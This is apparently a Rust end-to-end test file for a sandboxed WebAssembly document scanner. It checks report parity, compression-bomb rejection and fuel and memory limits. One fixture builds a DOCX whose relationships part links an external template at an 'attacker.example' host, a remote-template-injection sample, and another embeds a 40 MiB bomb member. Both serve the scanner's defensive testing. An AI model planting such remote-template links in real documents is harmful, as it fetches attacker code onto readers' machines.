//! End-to-end: the real `arca_guest_xray.wasm` inside `arca-sandbox`.
//!
//! Build the guest first, then point the test at it:
//!
//! ```text
//! cargo build -p arca-guest-xray --target wasm32-unknown-unknown --profile guest
//! ARCA_GUEST_XRAY_WASM=target/wasm32-unknown-unknown/guest/arca_guest_xray.wasm \
//!     cargo test -p arca-guest-xray --test e2e_sandbox
//! ```
//!
//! Without the variable the tests report themselves as skipped (CI always sets it).

#![allow(clippy::print_stderr, reason = "skip notice and corpus statistics")]
#![allow(clippy::unwrap_used, clippy::panic, reason = "test fixtures outside #[test] functions")]

use arca_container::zip::writer::{Compression, ZipWriter};
use arca_guest_xray::decode_report;
use arca_sandbox::{FuelPolicy, GuestModule, Sandbox, SandboxError, SandboxPolicy};
use arca_xray::{ThreatKind, Verdict};

fn guest() -> Option<GuestModule> {
    let path = std::env::var_os("ARCA_GUEST_XRAY_WASM")?;
    let bytes = std::fs::read(&path).unwrap_or_else(|e| panic!("cannot read {path:?}: {e}"));
    Some(GuestModule::new("arca-guest-xray", bytes))
}

fn docx(parts: &[(&str, &str)]) -> Vec<u8> {
    let mut base: Vec<(String, String)> = vec![
        ("[Content_Types].xml".into(), r#"<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>"#.into()),
        ("_rels/.rels".into(), r#"<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>"#.into()),
        ("word/document.xml".into(), r#"<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>hello</w:t></w:r></w:p></w:body></w:document>"#.into()),
    ];
    for (n, d) in parts {
        if let Some(p) = base.iter_mut().find(|(k, _)| k == n) {
            p.1 = (*d).to_owned();
        } else {
            base.push(((*n).to_owned(), (*d).to_owned()));
        }
    }
    let mut w = ZipWriter::new();
    for (n, d) in &base {
        w.add(n, d.as_bytes(), Compression::Deflated).unwrap();
    }
    w.finish().unwrap()
}

#[test]
fn guest_report_equals_native_report() {
    let Some(m) = guest() else {
        eprintln!("skipped: ARCA_GUEST_XRAY_WASM not set");
        return;
    };
    let sandbox = Sandbox::new(SandboxPolicy::default(), [m.pin()]);
    let template = docx(&[(
        "word/_rels/document.xml.rels",
        r#"<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://attacker.example/t.dotm" TargetMode="External"/></Relationships>"#,
    )]);
    for doc in [docx(&[]), template] {
        let out = sandbox.run(&m, &doc).unwrap();
        let report = decode_report(out.kind, &out.payload).unwrap();
        assert_eq!(report, arca_xray::scan_default(&doc));
        assert!(out.stats.fuel_consumed > 0);
    }
}

#[test]
fn guest_rejects_bombs_inside_the_sandbox() {
    let Some(m) = guest() else {
        eprintln!("skipped: ARCA_GUEST_XRAY_WASM not set");
        return;
    };
    let sandbox = Sandbox::new(SandboxPolicy::default(), [m.pin()]);
    let bomb = "A".repeat(40 << 20);
    let doc = docx(&[("word/media/bomb.xml", &bomb)]);
    let out = sandbox.run(&m, &doc).unwrap();
    let report = decode_report(out.kind, &out.payload).unwrap();
    assert_eq!(report.verdict, Verdict::Rejected);
    assert!(report.has(ThreatKind::CompressionBomb));
    // The guest never materialised the 40 MiB member.
    assert!(out.stats.peak_memory_bytes < 16 << 20, "peak {} bytes", out.stats.peak_memory_bytes);
}

#[test]
fn starved_guest_is_stopped() {
    let Some(m) = guest() else {
        eprintln!("skipped: ARCA_GUEST_XRAY_WASM not set");
        return;
    };
    let policy = SandboxPolicy {
        fuel: FuelPolicy { base: 50_000, per_input_byte: 0, max: 50_000 },
        ..SandboxPolicy::default()
    };
    let sandbox = Sandbox::new(policy, [m.pin()]);
    assert!(matches!(sandbox.run(&m, &docx(&[])), Err(SandboxError::FuelExhausted { .. })));
    // A 3 MiB input cannot even be copied into a guest capped at 2 MiB.
    let policy = SandboxPolicy { max_memory_bytes: 2 << 20, ..SandboxPolicy::default() };
    let sandbox = Sandbox::new(policy, [m.pin()]);
    let mut x = 0x2545_F491_4F6C_DD1Du64;
    let noise: Vec<u8> = (0..3usize << 20)
        .map(|_| {
            x ^= x << 13;
            x ^= x >> 7;
            x ^= x << 17;
            x.to_le_bytes()[0]
        })
        .collect();
    assert_eq!(sandbox.run(&m, &noise).unwrap_err(), SandboxError::MemoryLimitExceeded);
}

#[test]
fn real_world_corpus_if_provided() {
    // Optional: ARCA_CORPUS_DIR=/path/to/documents runs every file through the
    // guest and checks that it matches the native scan.
    let (Some(m), Some(dir)) = (guest(), std::env::var_os("ARCA_CORPUS_DIR")) else {
        eprintln!("skipped: ARCA_GUEST_XRAY_WASM / ARCA_CORPUS_DIR not set");
        return;
    };
    let sandbox = Sandbox::new(SandboxPolicy::default(), [m.pin()]);
    for entry in std::fs::read_dir(dir).unwrap() {
        let path = entry.unwrap().path();
        if !path.is_file() {
            continue;
        }
        let data = std::fs::read(&path).unwrap();
        let out = sandbox.run(&m, &data).unwrap_or_else(|e| panic!("{path:?}: {e}"));
        let report = decode_report(out.kind, &out.payload).unwrap();
        assert_eq!(report, arca_xray::scan_default(&data), "{path:?}");
        eprintln!(
            "{:<32} {:<10} {:<24} fuel={:>12} mem={:>6} KiB",
            path.file_name().unwrap().to_string_lossy(),
            format!("{:?}", report.format),
            format!("{:?}", report.verdict),
            out.stats.fuel_consumed,
            out.stats.peak_memory_bytes / 1024
        );
    }
}
